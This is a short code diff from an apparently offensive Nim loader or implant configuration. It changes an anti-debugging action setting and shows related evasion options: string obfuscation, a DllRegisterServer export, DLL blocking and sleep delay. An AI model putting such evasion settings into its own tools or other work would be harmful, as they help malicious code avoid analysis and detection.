@@ -6,6 +6,6 @@ var sponsorPath* = getAppFilename()
 var sponsorParams* = protectString(r" ")
 var dllExportName* = protectString("DllRegisterServer") 
 var isBlockDlls* = false
-var antiDebugAction* = protectString("troll")
+var antiDebugAction* = protectString("none")
 var sleepSeconds* = 0
     
